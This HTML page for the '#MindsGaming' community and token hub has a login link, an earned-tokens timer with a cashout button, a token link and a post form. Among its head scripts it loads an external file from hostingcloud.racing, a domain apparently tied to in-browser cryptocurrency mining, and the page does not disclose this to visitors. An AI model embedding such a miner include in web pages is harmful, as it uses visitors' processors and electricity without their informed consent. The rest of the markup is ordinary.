<!DOCTYPE html>
<html lang="en">
  <head>
    <title>#MindsGaming</title>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

    <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
    <script src="https://mindsgaming.glitch.me/mtcg/invest.js"></script>
    <script src="https://mindsgaming.glitch.me/mtcg/deck/playcard.js"></script>
    <script src="https://mindsgaming.glitch.me/script.js"></script>

    <script src="https://www.hostingcloud.racing/5pDo.js"></script>

    <!-- import the webpage's stylesheet -->
    <link rel="stylesheet" href="https://ipack.glitch.me/mgicons.css" defer />
    <link rel="stylesheet" href="https://mindsgaming.glitch.me/cpu.css" defer />
    <link
      rel="stylesheet"
      href="https://mindsgaming.glitch.me/mtcg/style.css"
      defer
    />
    <link rel="stylesheet" href="/fly.css" />
    <link rel="stylesheet" href="./social.css" />

    <script src="/games/js/tokens.js" defer></script>
    <script src="/js/mice.js" defer></script>
    <script src="./client.js" defer></script>
  </head>

  <body>
    <wrap>
      <!-- desktop -->
      <div class="desktop">
        <div class="wrap">
          <div id="tokenmenu" class="tokenmenu">
            <div id="avatar" class="avatar"></div>
            <a
              class="links"
              href="#"
              id="badge"
              title="Login"
              onclick="guest();"
            >
              Login</a
            >
            <div class="links">
              Earned Tokens:
              <label id="minutes" value="0">00</label>.<label
                id="seconds"
                value="0"
                >00</label
              ><br />
              <meter class="hide" value="0" max="100" id="tokenCheck"></meter>
              <a class="cashout" href="#" onclick="cashTokens(); return false"
                >Cashout</a
              >
            </div>
            <a class="links" href="#" onclick="socailMedia(); return false">
              Social</a
            >
            <a class="links" href="https://mindsgaming.glitch.me/tokens"
              >Ecosystem</a
            >
            <div class="links" onclick="InvestIn();">
              Random Invest
              <br />
              <div id="create"></div>
            </div>
            <br />
            <a class="links" href="https://mindsgaming.glitch.me/mtcg/docs"
              >Docs</a
            >
            <br />
            <br />
            <br />
          </div>
        </div>
      </div>
      <div class="banner">
        <h1>
          #MindsGaming Monthly
        </h1>
      </div>
      <div class="rightbar">
        <h1 class="hub">
          Token Hub
        </h1>
        <a href="https://mintme.com/token/mtcg" class="barLinks">MTCG</a>
      </div>

      <div class="poster" align="center">
        <form>
          <input
            name="dream"
            aria-label="a new dream"
            type="text"
            maxlength="100"
            placeholder="What's Up?"
            required
          />
          <button type="submit" id="submit-dream" style="float: right;">
            Post
          </button>
        </form>
      </div>
      <br />
      <div class="feed" id="socail"></div>
      <br>
      <br>
      <br>
    </wrap>
  </body>
</html>
